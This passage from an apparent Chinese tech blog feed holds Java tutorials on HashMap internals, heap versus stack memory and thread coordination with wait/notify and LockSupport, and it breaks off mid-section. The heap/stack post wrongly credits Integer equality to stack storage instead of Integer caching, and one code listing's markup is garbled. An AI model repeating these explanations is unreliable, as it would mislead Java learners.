<p>从控制台输出的内容看，好像是设置有些问题，我直接将JetBrains的相关设置全部清空，然后重新启动即可。</p>
<p>删除下面2个目录下所有与 jetbrains 和 旗下工具 相关的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Users&#x2F;chenguolin&#x2F;Library&#x2F;Application Support</span><br><span class="line">&#x2F;Users&#x2F;chenguolin&#x2F;Library&#x2F;Preferences</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>JetBrains</tag>
        <tag>开源项目</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解HashMap</title>
    <url>/2020/06/17/read-hashmap/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>基于jdk 1.8</p>
<p>1，HashMap的原理，内部数据结构是什么样的？</p>
<p>数组 + 单向链表的形式，这就是HashMap的存储方式，那么如何去验证呢？</p>
<h4 id="数组验证"><a href="#数组验证" class="headerlink" title="数组验证"></a>数组验证</h4><p>我们先从源头开始查找，一般情况下，我们使用HashMap都是从put方法开始，所以我们就来看看put方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The table, initialized on first use, and resized as</span></span><br><span class="line"><span class="comment"> * necessary. When allocated, length is always a power of two.</span></span><br><span class="line"><span class="comment"> * (We also tolerate length zero in some operations to allow</span></span><br><span class="line"><span class="comment"> * bootstrapping mechanics that are currently not needed.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Associates the specified value with the specified key in this map.</span></span><br><span class="line"><span class="comment"> * If the map previously contained a mapping for the key, the old</span></span><br><span class="line"><span class="comment"> * value is replaced.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> key key with which the specified value is to be associated</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value value to be associated with the specified key</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the previous value associated with &lt;tt&gt;key&lt;/tt&gt;, or</span></span><br><span class="line"><span class="comment"> *         &lt;tt&gt;null&lt;/tt&gt; if there was no mapping for &lt;tt&gt;key&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *         (A &lt;tt&gt;null&lt;/tt&gt; return can also indicate that the map</span></span><br><span class="line"><span class="comment"> *         previously associated &lt;tt&gt;null&lt;/tt&gt; with &lt;tt&gt;key&lt;/tt&gt;.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Implements Map.put and related methods</span><br><span class="line"> *</span><br><span class="line"> * <span class="meta">@param</span> hash hash <span class="keyword">for</span> key</span><br><span class="line"> * <span class="meta">@param</span> key the key</span><br><span class="line"> * <span class="meta">@param</span> value the value to put</span><br><span class="line"> * <span class="meta">@param</span> onlyIfAbsent <span class="keyword">if</span> <span class="keyword">true</span>, don<span class="string">&#x27;t change existing value</span></span><br><span class="line"><span class="string"> * @param evict if false, the table is in creation mode.</span></span><br><span class="line"><span class="string"> * @return previous value, or null if none</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span></span><br><span class="line"><span class="string">               boolean evict) &#123;</span></span><br><span class="line"><span class="string">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span></span><br><span class="line"><span class="string">    if ((tab = table) == null || (n = tab.length) == 0)</span></span><br><span class="line"><span class="string">        n = (tab = resize()).length;</span></span><br><span class="line"><span class="string">    if ((p = tab[i = (n - 1) &amp; hash]) == null)</span></span><br><span class="line"><span class="string">        tab[i] = newNode(hash, key, value, null);</span></span><br><span class="line"><span class="string">    else &#123;</span></span><br><span class="line"><span class="string">        Node&lt;K,V&gt; e; K k;</span></span><br><span class="line"><span class="string">        ……</span></span><br><span class="line"><span class="string">     …….</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>从上面的代码你发现了什么？是不是发现put方法操作的是内部类数组 Node&lt;K,V&gt;[] ，没错，它就是用数组来管理的。</p>
<h4 id="单向链表验证"><a href="#单向链表验证" class="headerlink" title="单向链表验证"></a>单向链表验证</h4><p>上面我们已经知道了HashMap是通过内部类Node&lt;K,V&gt;来进行数据维护的，<br>而我们通过源码可以发现，Node&lt;K,V&gt;类还维护了一个next节点，指向的就是下一个节点，<br>这里又充分表明了它是以链表的形式进行的管理，并且是单向。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    V value;</span><br><span class="line">    Node&lt;K,V&gt; next;</span><br><span class="line">    …..</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2，HashMap中的Hash算法的作用是什么呢？为什么需要这个Hash算法的存在？</p>
<p>HashMap是用数组的形式进行的存储，所以它是有大小和下标的，HashMap定义的数组的默认大小为16</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The default initial capacity - MUST be a power of two.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_INITIAL_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">4</span>; <span class="comment">// aka 16</span></span><br></pre></td></tr></table></figure>
<p>a，根据hash算法得到一个整型数<br>b，控制这个数字在0到15之间<br>c，用hash也使得下标尽可能的分散</p>
<p>怎么获取的一个整数呢？可以通过 ””.hashCode()</p>
<p>如何控制在0到15之间呢？我们可以通过%16来得到。但是HashMap并不是这样做的，它是通过.hashCode()获得一个int 32位的数值进行高16位和低16位的异或运算得到的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Computes key.hashCode() and spreads (XORs) higher bits of hash</span></span><br><span class="line"><span class="comment"> * to lower.  Because the table uses power-of-two masking, sets of</span></span><br><span class="line"><span class="comment"> * hashes that vary only in bits above the current mask will</span></span><br><span class="line"><span class="comment"> * always collide. (Among known examples are sets of Float keys</span></span><br><span class="line"><span class="comment"> * holding consecutive whole numbers in small tables.)  So we</span></span><br><span class="line"><span class="comment"> * apply a transform that spreads the impact of higher bits</span></span><br><span class="line"><span class="comment"> * downward. There is a tradeoff between speed, utility, and</span></span><br><span class="line"><span class="comment"> * quality of bit-spreading. Because many common sets of hashes</span></span><br><span class="line"><span class="comment"> * are already reasonably distributed (so don&#x27;t benefit from</span></span><br><span class="line"><span class="comment"> * spreading), and because we use trees to handle large sets of</span></span><br><span class="line"><span class="comment"> * collisions in bins, we just XOR some shifted bits in the</span></span><br><span class="line"><span class="comment"> * cheapest possible way to reduce systematic lossage, as well as</span></span><br><span class="line"><span class="comment"> * to incorporate impact of the highest bits that would otherwise</span></span><br><span class="line"><span class="comment"> * never be used in index calculations because of table bounds.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3，put的具体流程是什么？</p>
<p>a，我们上面已经说到了，HashMap在put的时候，会计算一个下标位置，那么，它会先去判断这个下标下是否已经有值，如果有值，那么比较一下，key是否相同，如果相同，那么对值进行一个覆盖操作，如果key不同，那么继续去判断该节点的next节点是否为空，如果不为空，那么继续向下判断，为空，则直接放到这个空间，也就形成了所谓的链表式存储，可以进行一个图解：</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/%E9%93%BE%E8%A1%A8.png" alt="单向链表图例"><br>￼</p>
<p>4，红黑树的引入</p>
<p>hashmap使用单项链表的形式来存储信息，那么必然会造成链表过长而导致性能地下的问题，<br>所以在jdk1.8之后，hashmap引入了红黑树，专门用来解决这个问题，那么我们下面就来看看它是怎么处理的。</p>
<p>我们来分析下putval方法中的这块代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The bin count threshold for using a tree rather than list for a</span></span><br><span class="line"><span class="comment"> * bin.  Bins are converted to trees when adding an element to a</span></span><br><span class="line"><span class="comment"> * bin with at least this many nodes. The value must be greater</span></span><br><span class="line"><span class="comment"> * than 2 and should be at least 8 to mesh with assumptions in</span></span><br><span class="line"><span class="comment"> * tree removal about conversion back to plain bins upon</span></span><br><span class="line"><span class="comment"> * shrinkage.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TREEIFY_THRESHOLD = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Node&lt;K,V&gt; e; K k;</span><br><span class="line"><span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">    ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">    e = p;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">    e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                treeifyBin(tab, hash);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        p = e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点关注 “if (binCount &gt;= TREEIFY_THRESHOLD - 1)”，如果链表的节点大于8的时候，将链表转换为红黑树</p>
<p>还有 “p instanceof TreeNode”，如果数据结构是树形，那么直接走红黑树的处理方式</p>
<p>5，扩容</p>
<p>无论是链表还是红黑树，我们的数组长度都只有16，所以总有用完的时候，那么我们就涉及到一<br>个扩容了，那么我们就要去了解下，什么时候扩容呢？如何扩容的呢？</p>
<p>a，扩容因子</p>
<p>什么时候开始扩容，这个问题，hashmap的开发者已经做了相应的设置，他定义了一个静态常量=0.75作为扩容因子，<br>当数组size()达到了<code>总长度*0.75</code>的时候，就进行扩容，比如：<code>16*0.75=12</code>，那么就表示当数组size()超过12的时候开始扩容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The load factor used when none specified in constructor.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">float</span> DEFAULT_LOAD_FACTOR = <span class="number">0.75f</span>;</span><br><span class="line"></span><br><span class="line">newThr = (<span class="keyword">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br></pre></td></tr></table></figure>
<p>扩容的步骤：<br>a，先计算一个新的数组的大小<br>b，创建一个新的数组，new<br>c，进行一个数据移动，old -&gt; new</p>
<p>内容主要有3种共存的节点形式，逐个进行判断，然后转移，具体代码体现如下：<br>a，数组有元素，next无元素<br>b，数组有元素，next为链表<br>c，数组有元素，next为红黑树</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[newCap];</span><br><span class="line">table = newTab;</span><br><span class="line"><span class="keyword">if</span> (oldTab != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">        Node&lt;K,V&gt; e;</span><br><span class="line">        <span class="keyword">if</span> ((e = oldTab[j]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            oldTab[j] = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (e.next == <span class="keyword">null</span>)</span><br><span class="line">                newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                ((TreeNode&lt;K,V&gt;)e).split(<span class="keyword">this</span>, newTab, j, oldCap);</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                Node&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">                Node&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                Node&lt;K,V&gt; next;</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    next = e.next;</span><br><span class="line">                    <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (loTail == <span class="keyword">null</span>)</span><br><span class="line">                            loHead = e;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            loTail.next = e;</span><br><span class="line">                        loTail = e;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hiTail == <span class="keyword">null</span>)</span><br><span class="line">                            hiHead = e;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            hiTail.next = e;</span><br><span class="line">                        hiTail = e;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">while</span> ((e = next) != <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (loTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    loTail.next = <span class="keyword">null</span>;</span><br><span class="line">                    newTab[j] = loHead;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (hiTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    hiTail.next = <span class="keyword">null</span>;</span><br><span class="line">                    newTab[j + oldCap] = hiHead;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> newTab;</span><br></pre></td></tr></table></figure>
<p>简单的看，也就这么多东西。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>hashmap</tag>
        <tag>底层</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>堆和栈的区别</title>
    <url>/2020/06/27/read-head-stack/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>java的内存有两种：堆内存和栈内存，堆和栈都是用来在内存中存放数据的地方，只是各自的运行机制有所不同。</p>
<h4 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h4><p>堆，是运行时数据区，通过new等指令建立的对象从堆中分配空间，然后通过GC垃圾回收器来进行销毁。</p>
<p>堆的内存空间大小，是由java自己在运行时动态分配的，不需要我们指定设置。不过，也因此导致对的存取速度相对比较慢。</p>
<p>下面的案例，存放在堆中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer num = <span class="keyword">new</span> Integer(<span class="number">123</span>);</span><br></pre></td></tr></table></figure>
<h4 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈"></a>什么是栈</h4><p>栈，主要存放一些基本数据类型的变量和对象的引用，栈的数据是可以共享的。</p>
<p>基本数量类型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">byte，short，int，long，float，double，boolean，char</span><br></pre></td></tr></table></figure>
<p>栈的内存空间大小，在程序编译时，就指定确认下来。所以栈的存取速度比堆快，而且仅次于寄存器。</p>
<p>下面的案例，存放在栈中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer num = <span class="number">123</span>;</span><br></pre></td></tr></table></figure>
<h4 id="验证他们的区别？"><a href="#验证他们的区别？" class="headerlink" title="验证他们的区别？"></a>验证他们的区别？</h4><p>堆和栈，我们已经有了对它们了解，也认识了它们的区别，那么我们来看看如何去进行验证？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 堆数据，每个new出来的对象都独立占用一块内存</span></span><br><span class="line">    Integer num_d_1 = <span class="keyword">new</span> Integer(<span class="number">123</span>);</span><br><span class="line">    Integer num_d_2 = <span class="keyword">new</span> Integer(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 栈数据，存放的是对象的引用</span></span><br><span class="line">    Integer num_z_1 = <span class="number">123</span>;</span><br><span class="line">    Integer num_z_2 = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基本数据类型，存放在栈中</span></span><br><span class="line">    <span class="keyword">int</span> num_j_1 = <span class="keyword">new</span> Integer(<span class="number">123</span>);</span><br><span class="line">    <span class="keyword">int</span> num_j_2 = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;堆对象比较：&quot;</span> + (num_d_1 == num_d_2));</span><br><span class="line">    System.out.println(<span class="string">&quot;栈对象比较：&quot;</span> + (num_z_1 == num_z_2));</span><br><span class="line">    System.out.println(<span class="string">&quot;基本数据类型比较：&quot;</span> + (num_j_1 == num_j_2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆对象比较：false</span><br><span class="line">栈对象比较：true</span><br><span class="line">基本数据类型比较：true</span><br></pre></td></tr></table></figure>
<p>上面的案例，诠释了它们的区别：<br>堆，每个new出来的对象都独立占用一块内存地址，所以两者不相等。<br>栈，因为上一个值存在，而直接指向了相同的内存地址，所以两者相等。<br>基本类型，存放的就直接是值，所以相等。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>堆</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>线程通讯</title>
    <url>/2020/06/22/read-thread-sync/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>线程通讯的本质，其实就是通知和控制，而在一个线程中，通过十八般武艺去控制其他线程的方法，就是线程通讯实现方式。</p>
<p>其目的是为了线程之间更好的协作，从而完成一些复杂的工作。</p>
<h4 id="线程通讯的几种方式"><a href="#线程通讯的几种方式" class="headerlink" title="线程通讯的几种方式"></a>线程通讯的几种方式</h4><p>想要实现线程之间的通讯，方式方法非常的多，下面我们举一个很简单的线程题目，通过几种比较常见的方法去完成这道题目，从而理解线程之间通讯的过程和方法。</p>
<h5 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">假设有2个线程，一个线程仅打印数字，一个线程仅打印字母。而需求是要实现数字和字母交替打印的效果，</span><br><span class="line">并且第一个打印的必须是数字，如：1A2B3C.. 应该如何去实现呢？</span><br></pre></td></tr></table></figure>
<h5 id="notify-wait方式"><a href="#notify-wait方式" class="headerlink" title="notify + wait方式"></a>notify + wait方式</h5><p>使用notify和wait的时候呢，我们必须先使用关键字synchronized加锁对象，否则是无法使用对象的这两个方法的。</p>
<p>所以准确的说，应该是synchronized + notify/wait的实现方式。</p>
<p>主要方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notify(): 随机唤醒一个等待的线程</span><br><span class="line"></span><br><span class="line">notifyAll(): 唤醒所有等待的线程</span><br><span class="line"></span><br><span class="line">wait(): 使当前线程进入等待状态</span><br></pre></td></tr></table></figure>
<p>演示案例实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NotifyWaitTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个对象，用于synchronized锁，为什么要锁定一个公共对象而不直接用this？因为匿名类的</span></span><br><span class="line">    <span class="comment">// 原因，用this其实是锁定的线程各自的匿名类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object obj = <span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 数字优先输出，所以字母先进入等待队列 等待叫醒</span></span><br><span class="line">                    obj.wait();</span><br><span class="line">                    <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                        <span class="comment">// 打印字母</span></span><br><span class="line">                        System.out.print(str);</span><br><span class="line">                        <span class="comment">// 通知其他线程运行</span></span><br><span class="line">                        obj.notify();</span><br><span class="line">                        <span class="comment">// 当前线程让出锁，进入等待队列</span></span><br><span class="line">                        obj.wait();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 保证线程正常关闭</span></span><br><span class="line">                obj.notify();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj)&#123;</span><br><span class="line">                <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                    <span class="comment">// 打印数字</span></span><br><span class="line">                    System.out.print(num);</span><br><span class="line">                    <span class="comment">// 通知其他线程运行</span></span><br><span class="line">                    obj.notify();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 当前线程让出锁，进入等待队列</span></span><br><span class="line">                        obj.wait();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 保证线程正常关闭</span></span><br><span class="line">                obj.notify();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="LockSupport方式"><a href="#LockSupport方式" class="headerlink" title="LockSupport方式"></a>LockSupport方式</h5><p>LockSupport是一个工具类，内部所有的方法都是静态的，而其功能，主要就是对线程进行阻塞和唤醒。</p>
<p>同样的，我们通过LockSupport控制线程的阻塞和唤醒，也是可以轻易完成以上案例要求的。</p>
<p>主要方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void part(): 阻塞当前线程</span><br><span class="line"></span><br><span class="line">void parkUntil(long deadline): 阻塞当前线程，并指定截止时间(单位:13位的时间戳)</span><br><span class="line"></span><br><span class="line">void parkNanos(long nanos): 阻塞当前线程，并设置超时时间(单位:纳秒，1秒&#x3D;1000000000L纳秒)</span><br><span class="line"></span><br><span class="line">unpark(Thread thread): 唤醒指定线程</span><br></pre></td></tr></table></figure>
<p>演示案例实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LockSupportTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义2个线程，用于分别打印字母和数字</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Thread thread4letter = <span class="keyword">null</span>, thread4number = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        thread4letter = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// 优先输出数字，字母线程阻塞</span></span><br><span class="line">            LockSupport.park();</span><br><span class="line">            <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                <span class="comment">// 打印字母</span></span><br><span class="line">                System.out.print(str);</span><br><span class="line">                <span class="comment">// 唤醒数字线程</span></span><br><span class="line">                LockSupport.unpark(thread4number);</span><br><span class="line">                <span class="comment">// 阻塞当前线程，可以被unpark唤醒</span></span><br><span class="line">                LockSupport.park();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 保证线程正常关闭</span></span><br><span class="line">            LockSupport.unpark(thread4number);</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">        thread4number = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                <span class="comment">// 打印数字</span></span><br><span class="line">                System.out.print(num);</span><br><span class="line">                <span class="comment">// 唤醒字母线程</span></span><br><span class="line">                LockSupport.unpark(thread4letter);</span><br><span class="line">                <span class="comment">// 阻塞当前线程，可以被unpark唤醒</span></span><br><span class="line">                LockSupport.park();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 保证线程正常关闭</span></span><br><span class="line">            LockSupport.unpark(thread4letter);</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动2个线程</span></span><br><span class="line">        thread4letter.start();</span><br><span class="line">        thread4number.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Lock-Condition方式"><a href="#Lock-Condition方式" class="headerlink" title="Lock + Condition方式"></a>Lock + Condition方式</h5><p>Lock + Condition来实现这个案例，相对来说是比较优雅的，因为它可以给锁指定多个条件，我们通过操控条件，就可以轻易的在不同场景下完成对锁的控制，从而完成对线程的控制。</p>
<p>演示案例实现：</p>
